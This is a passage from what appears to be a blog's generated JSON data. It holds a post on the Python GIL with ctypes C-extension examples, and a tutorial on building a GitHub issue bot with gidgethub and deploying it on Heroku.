thread. In addition, context switching will also slow down the program and cause more waste of resources.\n\n## Solution\n\nThere are many ways to overcome this obstacle. Here are some solutions to bypass the GIL:\n\n1. Use another interpreter to execute Python, such as PyPy, Jython.\n2. Use multi-processes with pools to perform CPU-bound tasks.\n3. Use C extensions to write the key block that you really care about.\n\nSo now, let's deep dive into the third solution since the first two are easy to figure out.\n\n## C extensions\n\nIf we want to write the C extension, we can use the `ctypes` module to load our c program dynamically. For example, if we want to call a function `say_hello` look like below:\n\n```c=\n#include<stdio.h>\n\nvoid say_hello() {\n\n  printf(\"This is a function call from C Language\\n\");\n\n}\n```\n\nThen we use the below command to compile it to shared library\n\n```bash=\ngcc share_method.c -shared -o share_method.so\n```\n\nThen we can use the `ctypes` module in Python to invoke the method from the C program in the Python program.\n\n```python=\nfrom ctypes import cdll\n\nif __name__ == '__main__':\n    lib = cdll.LoadLibrary(\"share_method.so\")\n\n    lib.say_hello()\n```\n\nThe output of this program is below:\n\n\n> This is a function call from C Language\n\n\nIf we want to do CPU-bound analysis, we can modify our C code to the below:\n\n```c=\nvoid loop() {\n//   create a dead loop here\n    printf(\"This is a function call from infinite loop \\n\");\n  while (1) {\n    ;\n  }\n}\n```\nIt will be similar to CPU-bound calculations.\n\nThen we can use Python Thread to call this method via `ctypes`\n\n```python=\nfrom ctypes import cdll\nfrom threading import Thread\n\nif __name__ == '__main__':\n    lib = cdll.LoadLibrary(\"share_method.so\")\n\n    t = Thread(target=lib.loop)\n\n    t.start()\n```\nFinally, we can see two of our CPUs got high usage with the `top` command.\n\n## Conclusion\n\nGIL seems to be an inevitable problem when dealing with multi-threaded programming, but it is still useful in IO-bound tasks such as web crawlers and file operations, etc. So it depends on the situation you have to solve.\n\nThe conclusion is below:\n\n1. If you want to deal with IO-bound tasks, then use the multi-thread with pool.\n2. If you want to deal with CPU-bound tasks, then use the multi-process with pool.\n3. Or you can also use some techniques above to bypass the GIL.\n\n","source":"_posts/GIL.md","raw":"---\ntitle: GIL, the magic lock inside the CPython\ndate: 2021-11-24 10:42:53\ntags:\n---\n\n# GIL, the magic lock inside the CPython\n\nWhat makes Python different from other languages, the GIL(**Global Interpreter Lock**) must be the cherry on top of the cake.\n\nSimply put, the GIL is a lock inside the CPython interpreter to prevent the reference counting of an object from becoming a race condition at the bytecode level.\n\nThe reference counting would look like this:\n\n```python=\nimport sys\na = [1,2]\nb = a\n\nprint(sys.getrefcount(a)) # 3\n```\n\nSince Python garbage collection uses reference counting to check unused objects at runtime, each object in the runtime will use a number count to check whether it is used by other objects. If not, then CPython will delete the object to free the memory to avoid memory leaks.\n\n## Disadvantages\n\nThe purpose of using the GIL is to deal with the issue of reference counting. However, due to this lock, there are some disadvantages related to it. For example:\n\n1. Threads in Python become useless, especially when dealing with CPU-bound tasks. Moreover, it slows down even lower than a single thread.\n2. When using multi-threads or multi-process, even if there is a GIL, the locking mechanism is still needed.\n\n## Comparison of single-process, multi-thread, multi-process, and process pool.\n\nIf we conduct a simple test to write our program using the above four methods to compare the speed, then we can see the result by order will like below:\n\nMulti-process-pool > Multi-process > Single process > Multi-thread\n\nThe reason why multithreading is the last one is because of the GIL, even if there are many threads, tasks in Python can still only run on a single thread. In addition, context switching will also slow down the program and cause more waste of resources.\n\n## Solution\n\nThere are many ways to overcome this obstacle. Here are some solutions to bypass the GIL:\n\n1. Use another interpreter to execute Python, such as PyPy, Jython.\n2. Use multi-processes with pools to perform CPU-bound tasks.\n3. Use C extensions to write the key block that you really care about.\n\nSo now, let's deep dive into the third solution since the first two are easy to figure out.\n\n## C extensions\n\nIf we want to write the C extension, we can use the `ctypes` module to load our c program dynamically. For example, if we want to call a function `say_hello` look like below:\n\n```c=\n#include<stdio.h>\n\nvoid say_hello() {\n\n  printf(\"This is a function call from C Language\\n\");\n\n}\n```\n\nThen we use the below command to compile it to shared library\n\n```bash=\ngcc share_method.c -shared -o share_method.so\n```\n\nThen we can use the `ctypes` module in Python to invoke the method from the C program in the Python program.\n\n```python=\nfrom ctypes import cdll\n\nif __name__ == '__main__':\n    lib = cdll.LoadLibrary(\"share_method.so\")\n\n    lib.say_hello()\n```\n\nThe output of this program is below:\n\n\n> This is a function call from C Language\n\n\nIf we want to do CPU-bound analysis, we can modify our C code to the below:\n\n```c=\nvoid loop() {\n//   create a dead loop here\n    printf(\"This is a function call from infinite loop \\n\");\n  while (1) {\n    ;\n  }\n}\n```\nIt will be similar to CPU-bound calculations.\n\nThen we can use Python Thread to call this method via `ctypes`\n\n```python=\nfrom ctypes import cdll\nfrom threading import Thread\n\nif __name__ == '__main__':\n    lib = cdll.LoadLibrary(\"share_method.so\")\n\n    t = Thread(target=lib.loop)\n\n    t.start()\n```\nFinally, we can see two of our CPUs got high usage with the `top` command.\n\n## Conclusion\n\nGIL seems to be an inevitable problem when dealing with multi-threaded programming, but it is still useful in IO-bound tasks such as web crawlers and file operations, etc. So it depends on the situation you have to solve.\n\nThe conclusion is below:\n\n1. If you want to deal with IO-bound tasks, then use the multi-thread with pool.\n2. If you want to deal with CPU-bound tasks, then use the multi-process with pool.\n3. Or you can also use some techniques above to bypass the GIL.\n\n","slug":"GIL","published":1,"updated":"2023-04-20T07:41:28.341Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepmt000bi7ridt4mft2j","content":"<h1 id=\"GIL-the-magic-lock-inside-the-CPython\"><a href=\"#GIL-the-magic-lock-inside-the-CPython\" class=\"headerlink\" title=\"GIL, the magic lock inside the CPython\"></a>GIL, the magic lock inside the CPython</h1><p>What makes Python different from other languages, the GIL(<strong>Global Interpreter Lock</strong>) must be the cherry on top of the cake.</p>\n<p>Simply put, the GIL is a lock inside the CPython interpreter to prevent the reference counting of an object from becoming a race condition at the bytecode level.</p>\n<p>The reference counting would look like this:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\">a = [<span class=\"number\">1</span>,<span class=\"number\">2</span>]</span><br><span class=\"line\">b = a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(sys.getrefcount(a)) <span class=\"comment\"># 3</span></span><br></pre></td></tr></table></figure>\n\n<p>Since Python garbage collection uses reference counting to check unused objects at runtime, each object in the runtime will use a number count to check whether it is used by other objects. If not, then CPython will delete the object to free the memory to avoid memory leaks.</p>\n<h2 id=\"Disadvantages\"><a href=\"#Disadvantages\" class=\"headerlink\" title=\"Disadvantages\"></a>Disadvantages</h2><p>The purpose of using the GIL is to deal with the issue of reference counting. However, due to this lock, there are some disadvantages related to it. For example:</p>\n<ol>\n<li>Threads in Python become useless, especially when dealing with CPU-bound tasks. Moreover, it slows down even lower than a single thread.</li>\n<li>When using multi-threads or multi-process, even if there is a GIL, the locking mechanism is still needed.</li>\n</ol>\n<h2 id=\"Comparison-of-single-process-multi-thread-multi-process-and-process-pool\"><a href=\"#Comparison-of-single-process-multi-thread-multi-process-and-process-pool\" class=\"headerlink\" title=\"Comparison of single-process, multi-thread, multi-process, and process pool.\"></a>Comparison of single-process, multi-thread, multi-process, and process pool.</h2><p>If we conduct a simple test to write our program using the above four methods to compare the speed, then we can see the result by order will like below:</p>\n<p>Multi-process-pool &gt; Multi-process &gt; Single process &gt; Multi-thread</p>\n<p>The reason why multithreading is the last one is because of the GIL, even if there are many threads, tasks in Python can still only run on a single thread. In addition, context switching will also slow down the program and cause more waste of resources.</p>\n<h2 id=\"Solution\"><a href=\"#Solution\" class=\"headerlink\" title=\"Solution\"></a>Solution</h2><p>There are many ways to overcome this obstacle. Here are some solutions to bypass the GIL:</p>\n<ol>\n<li>Use another interpreter to execute Python, such as PyPy, Jython.</li>\n<li>Use multi-processes with pools to perform CPU-bound tasks.</li>\n<li>Use C extensions to write the key block that you really care about.</li>\n</ol>\n<p>So now, let’s deep dive into the third solution since the first two are easy to figure out.</p>\n<h2 id=\"C-extensions\"><a href=\"#C-extensions\" class=\"headerlink\" title=\"C extensions\"></a>C extensions</h2><p>If we want to write the C extension, we can use the <code>ctypes</code> module to load our c program dynamically. For example, if we want to call a function <code>say_hello</code> look like below:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">say_hello</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This is a function call from C Language\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Then we use the below command to compile it to shared library</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc share_method.c -shared -o share_method.so</span><br></pre></td></tr></table></figure>\n\n<p>Then we can use the <code>ctypes</code> module in Python to invoke the method from the C program in the Python program.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> cdll</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    lib = cdll.LoadLibrary(<span class=\"string\">&quot;share_method.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    lib.say_hello()</span><br></pre></td></tr></table></figure>\n\n<p>The output of this program is below:</p>\n<blockquote>\n<p>This is a function call from C Language</p>\n</blockquote>\n<p>If we want to do CPU-bound analysis, we can modify our C code to the below:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">loop</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"><span class=\"comment\">//   create a dead loop here</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This is a function call from infinite loop \\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>It will be similar to CPU-bound calculations.</p>\n<p>Then we can use Python Thread to call this method via <code>ctypes</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> cdll</span><br><span class=\"line\"><span class=\"keyword\">from</span> threading <span class=\"keyword\">import</span> Thread</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    lib = cdll.LoadLibrary(<span class=\"string\">&quot;share_method.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    t = Thread(target=lib.loop)</span><br><span class=\"line\"></span><br><span class=\"line\">    t.start()</span><br></pre></td></tr></table></figure>\n<p>Finally, we can see two of our CPUs got high usage with the <code>top</code> command.</p>\n<h2 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h2><p>GIL seems to be an inevitable problem when dealing with multi-threaded programming, but it is still useful in IO-bound tasks such as web crawlers and file operations, etc. So it depends on the situation you have to solve.</p>\n<p>The conclusion is below:</p>\n<ol>\n<li>If you want to deal with IO-bound tasks, then use the multi-thread with pool.</li>\n<li>If you want to deal with CPU-bound tasks, then use the multi-process with pool.</li>\n<li>Or you can also use some techniques above to bypass the GIL.</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"GIL-the-magic-lock-inside-the-CPython\"><a href=\"#GIL-the-magic-lock-inside-the-CPython\" class=\"headerlink\" title=\"GIL, the magic lock inside the CPython\"></a>GIL, the magic lock inside the CPython</h1><p>What makes Python different from other languages, the GIL(<strong>Global Interpreter Lock</strong>) must be the cherry on top of the cake.</p>\n<p>Simply put, the GIL is a lock inside the CPython interpreter to prevent the reference counting of an object from becoming a race condition at the bytecode level.</p>\n<p>The reference counting would look like this:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\">a = [<span class=\"number\">1</span>,<span class=\"number\">2</span>]</span><br><span class=\"line\">b = a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(sys.getrefcount(a)) <span class=\"comment\"># 3</span></span><br></pre></td></tr></table></figure>\n\n<p>Since Python garbage collection uses reference counting to check unused objects at runtime, each object in the runtime will use a number count to check whether it is used by other objects. If not, then CPython will delete the object to free the memory to avoid memory leaks.</p>\n<h2 id=\"Disadvantages\"><a href=\"#Disadvantages\" class=\"headerlink\" title=\"Disadvantages\"></a>Disadvantages</h2><p>The purpose of using the GIL is to deal with the issue of reference counting. However, due to this lock, there are some disadvantages related to it. For example:</p>\n<ol>\n<li>Threads in Python become useless, especially when dealing with CPU-bound tasks. Moreover, it slows down even lower than a single thread.</li>\n<li>When using multi-threads or multi-process, even if there is a GIL, the locking mechanism is still needed.</li>\n</ol>\n<h2 id=\"Comparison-of-single-process-multi-thread-multi-process-and-process-pool\"><a href=\"#Comparison-of-single-process-multi-thread-multi-process-and-process-pool\" class=\"headerlink\" title=\"Comparison of single-process, multi-thread, multi-process, and process pool.\"></a>Comparison of single-process, multi-thread, multi-process, and process pool.</h2><p>If we conduct a simple test to write our program using the above four methods to compare the speed, then we can see the result by order will like below:</p>\n<p>Multi-process-pool &gt; Multi-process &gt; Single process &gt; Multi-thread</p>\n<p>The reason why multithreading is the last one is because of the GIL, even if there are many threads, tasks in Python can still only run on a single thread. In addition, context switching will also slow down the program and cause more waste of resources.</p>\n<h2 id=\"Solution\"><a href=\"#Solution\" class=\"headerlink\" title=\"Solution\"></a>Solution</h2><p>There are many ways to overcome this obstacle. Here are some solutions to bypass the GIL:</p>\n<ol>\n<li>Use another interpreter to execute Python, such as PyPy, Jython.</li>\n<li>Use multi-processes with pools to perform CPU-bound tasks.</li>\n<li>Use C extensions to write the key block that you really care about.</li>\n</ol>\n<p>So now, let’s deep dive into the third solution since the first two are easy to figure out.</p>\n<h2 id=\"C-extensions\"><a href=\"#C-extensions\" class=\"headerlink\" title=\"C extensions\"></a>C extensions</h2><p>If we want to write the C extension, we can use the <code>ctypes</code> module to load our c program dynamically. For example, if we want to call a function <code>say_hello</code> look like below:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">say_hello</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This is a function call from C Language\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Then we use the below command to compile it to shared library</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc share_method.c -shared -o share_method.so</span><br></pre></td></tr></table></figure>\n\n<p>Then we can use the <code>ctypes</code> module in Python to invoke the method from the C program in the Python program.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> cdll</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    lib = cdll.LoadLibrary(<span class=\"string\">&quot;share_method.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    lib.say_hello()</span><br></pre></td></tr></table></figure>\n\n<p>The output of this program is below:</p>\n<blockquote>\n<p>This is a function call from C Language</p>\n</blockquote>\n<p>If we want to do CPU-bound analysis, we can modify our C code to the below:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">loop</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"><span class=\"comment\">//   create a dead loop here</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This is a function call from infinite loop \\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>It will be similar to CPU-bound calculations.</p>\n<p>Then we can use Python Thread to call this method via <code>ctypes</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> cdll</span><br><span class=\"line\"><span class=\"keyword\">from</span> threading <span class=\"keyword\">import</span> Thread</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    lib = cdll.LoadLibrary(<span class=\"string\">&quot;share_method.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    t = Thread(target=lib.loop)</span><br><span class=\"line\"></span><br><span class=\"line\">    t.start()</span><br></pre></td></tr></table></figure>\n<p>Finally, we can see two of our CPUs got high usage with the <code>top</code> command.</p>\n<h2 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h2><p>GIL seems to be an inevitable problem when dealing with multi-threaded programming, but it is still useful in IO-bound tasks such as web crawlers and file operations, etc. So it depends on the situation you have to solve.</p>\n<p>The conclusion is below:</p>\n<ol>\n<li>If you want to deal with IO-bound tasks, then use the multi-thread with pool.</li>\n<li>If you want to deal with CPU-bound tasks, then use the multi-process with pool.</li>\n<li>Or you can also use some techniques above to bypass the GIL.</li>\n</ol>\n"},{"title":"Github Bot","date":"2022-04-22T06:56:57.000Z","_content":"\n# Github Bot\n\n\n\nRegister [Heroku](https://signup.heroku.com)\n\n\n## Local setting\n\n```\npip install gidgethub\n```\n\nget your Github Token\n\n\nIn Unix / Mac OS:\n```\nexport GH_AUTH=your token\n```\n\n## Local test\n\n```python=\nimport asyncio\nimport os\nimport aiohttp\nfrom gidgethub.aiohttp import GitHubAPI\n\nasync def main():\n    \n   async with aiohttp.ClientSession() as session:\n       gh = GitHubAPI(session, \"krnick\", oauth_token=os.getenv(\"GH_AUTH\"))\n       \n       # 開啟新的 issue\n       await gh.post('/repos/krnick/Github-Bot/issues',\n             data={\n                 'title': 'Hello Nick',\n                 'body': 'This is github bot from JunWei',\n             })\n             \n             \n        # 關閉 issue\n       await gh.patch('/repos/krnick/Github-Bot/issues/1',\n             data={'state': 'closed'},\n             )\n\nloop = asyncio.get_event_loop()\nloop.run_until_complete(main())\n\n```\n\n\n\n## deploy\n\ncreate a new APP\n![](https://i.imgur.com/gzBhd98.png)\nauth\n![](https://i.imgur.com/JBnDaeP.png)\nconnect Github\n![](https://i.imgur.com/yGLo7zQ.png)\n\n![](https://i.imgur.com/Ni8AacE.png)\n\n\n![](https://i.imgur.com/P2iA4fc.jpg)\n![](https://i.imgur.com/KNm6cJ5.png)\n\n---\nCreat a new webhook at the repo you want to build\n\n![](https://i.imgur.com/MpcbHjw.png)\n![](https://i.imgur.com/jhyt9Zj.png)\n![](https://i.imgur.com/FyljvND.png)\n\nSet your key at Heroku\n\n\nGH_AUTH\n\nGH_SECRET\n\n\n\n## typo check repos example\n\n![](https://i.imgur.com/1LdIE7z.png)\n![](https://i.imgur.com/zUQiEZn.png)\n![](https://i.imgur.com/7G8Zg58.png)\n![](https://i.imgur.com/wMZShV5.png)\n![](https://i.imgur.com/PtDjJze.png)\n![](https://i.imgur.com/DPPEXv2.png)\n![](https://i.imgur.com/AgmG33A.png)\n\n\n## Ref\n\nhttps://github-bot-tutorial.readthedocs.io/en/latest/index.html\n","source":"_posts/Github-Bot.md","raw":"---\ntitle: Github Bot\ndate: 2022-04-22 14:56:57\ntags:\n---\n\n# Github Bot\n\n\n\nRegister [Heroku](https://signup.heroku.com)\n\n\n## Local setting\n\n```\npip install gidgethub\n```\n\nget your Github Token\n\n\nIn Unix / Mac OS:\n```\nexport GH_AUTH=your token\n```\n\n## Local test\n\n```python=\nimport asyncio\nimport os\nimport aiohttp\nfrom gidgethub.aiohttp import GitHubAPI\n\nasync def main():\n    \n   async with aiohttp.ClientSession() as session:\n       gh = GitHubAPI(session, \"krnick\", oauth_token=os.getenv(\"GH_AUTH\"))\n       \n       # 開啟新的 issue\n       await gh.post('/repos/krnick/Github-Bot/issues',\n             data={\n                 'title': 'Hello Nick',\n                 'body': 'This is github bot from JunWei',\n             })\n             \n             \n        # 關閉 issue\n       await gh.patch('/repos/krnick/Github-Bot/issues/1',\n             data={'state': 'closed'},\n             )\n\nloop = asyncio.get_event_loop()\nloop.run_until_complete(main())\n\n```\n\n\n\n## deploy\n\ncreate a new APP\n![](https://i.imgur.com/gzBhd98.png)\nauth\n![](https://i.imgur.com/JBnDaeP.png)\nconnect Github\n![](https://i.imgur.com/yGLo7zQ.png)\n\n![](https://i.imgur.com/Ni8AacE.png)\n\n\n![](https://i.imgur.com/P2iA4fc.jpg)\n![](https://i.imgur.com/KNm6cJ5.png)\n\n---\nCreat a new webhook at the repo you want to build\n\n![](https://i.imgur.com/MpcbHjw.png)\n![](https://i.imgur.com/jhyt9Zj.png)\n![](https://i.imgur.com/FyljvND.png)\n\nSet your key at Heroku\n\n\nGH_AUTH\n\nGH_SECRET\n\n\n\n## typo check repos example\n\n![](https://i.imgur.com/1LdIE7z.png)\n![](https://i.imgur.com/zUQiEZn.png)\n![](https://i.imgur.com/7G8Zg58.png)\n![](https://i.imgur.com/wMZShV5.png)\n![](https://i.imgur.com/PtDjJze.png)\n![](https://i.imgur.com/DPPEXv2.png)\n![](https://i.imgur.com/AgmG33A.png)\n\n\n## Ref\n\nhttps://github-bot-tutorial.readthedocs.io/en/latest/index.html\n","slug":"Github-Bot","published":1,"updated":"2023-04-20T07:41:28.342Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepmu000ci7riaskj8t12","content":"<h1 id=\"Github-Bot\"><a href=\"#Github-Bot\" class=\"headerlink\" title=\"Github Bot\"></a>Github Bot</h1><p>Register <a href=\"https://signup.heroku.com/\">Heroku</a></p>\n<h2 id=\"Local-setting\"><a href=\"#Local-setting\" class=\"headerlink\" title=\"Local setting\"></a>Local setting</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install gidgethub</span><br></pre></td></tr></table></figure>\n\n<p>get your Github Token</p>\n<p>In Unix &#x2F; Mac OS:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export GH_AUTH=your token</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Local-test\"><a href=\"#Local-test\" class=\"headerlink\" title=\"Local test\"></a>Local test</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> asyncio</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> aiohttp</span><br><span class=\"line\"><span class=\"keyword\">from</span> gidgethub.aiohttp <span class=\"keyword\">import</span> GitHubAPI</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    </span><br><span class=\"line\">   <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> aiohttp.ClientSession() <span class=\"keyword\">as</span> session:</span><br><span class=\"line\">       gh = GitHubAPI(session, <span class=\"string\">&quot;krnick&quot;</span>, oauth_token=os.getenv(<span class=\"string\">&quot;GH_AUTH&quot;</span>))</span><br><span class=\"line\">       </span><br><span class=\"line\">       <span class=\"comment\"># 開啟新的 issue</span></span><br><span class=\"line\">       <span class=\"keyword\">await</span> gh.post(<span class=\"string\">&#x27;/repos/krnick/Github-Bot/issues&#x27;</span>,</span><br><span class=\"line\">             data=&#123;</span><br><span class=\"line\">                 <span class=\"string\">&#x27;title&#x27;</span>: <span class=\"string\">&#x27;Hello Nick&#x27;</span>,</span><br><span class=\"line\">                 <span class=\"string\">&#x27;body&#x27;</span>: <span class=\"string\">&#x27;This is github bot from JunWei&#x27;</span>,</span><br><span class=\"line\">             &#125;)</span><br><span class=\"line\">             </span><br><span class=\"line\">             </span><br><span class=\"line\">        <span class=\"comment\"># 關閉 issue</span></span><br><span class=\"line\">       <span class=\"keyword\">await</span> gh.patch(<span class=\"string\">&#x27;/repos/krnick/Github-Bot/issues/1&#x27;</span>,</span><br><span class=\"line\">             data=&#123;<span class=\"string\">&#x27;state&#x27;</span>: <span class=\"string\">&#x27;closed&#x27;</span>&#125;,</span><br><span class=\"line\">             )</span><br><span class=\"line\"></span><br><span class=\"line\">loop = asyncio.get_event_loop()</span><br><span class=\"line\">loop.run_until_complete(main())</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"deploy\"><a href=\"#deploy\" class=\"headerlink\" title=\"deploy\"></a>deploy</h2><p>create a new APP<br><img src=\"https://i.imgur.com/gzBhd98.png\"><br>auth<br><img src=\"https://i.imgur.com/JBnDaeP.png\"><br>connect Github<br><img src=\"https://i.imgur.com/yGLo7zQ.png\"></p>\n<p><img src=\"https://i.imgur.com/Ni8AacE.png\"></p>\n<p><img src=\"https://i.imgur.com/P2iA4fc.jpg\"><br><img src=\"https://i.imgur.com/KNm6cJ5.png\"></p>\n<hr>\n<p>Creat a new webhook at the repo you want to build</p>\n<p><img src=\"https://i.imgur.com/MpcbHjw.png\"><br><img src=\"https://i.imgur.com/jhyt9Zj.png\"><br><img src=\"https://i.imgur.com/FyljvND.png\"></p>\n<p>Set your key at Heroku</p>\n<p>GH_AUTH</p>\n<p>GH_SECRET</p>\n<h2 id=\"typo-check-repos-example\"><a href=\"#typo-check-repos-example\" class=\"headerlink\" title=\"typo check repos example\"></a>typo check repos example</h2><p><img src=\"https://i.imgur.com/1LdIE7z.png\"><br><img src=\"https://i.imgur.com/zUQiEZn.png\"><br><img 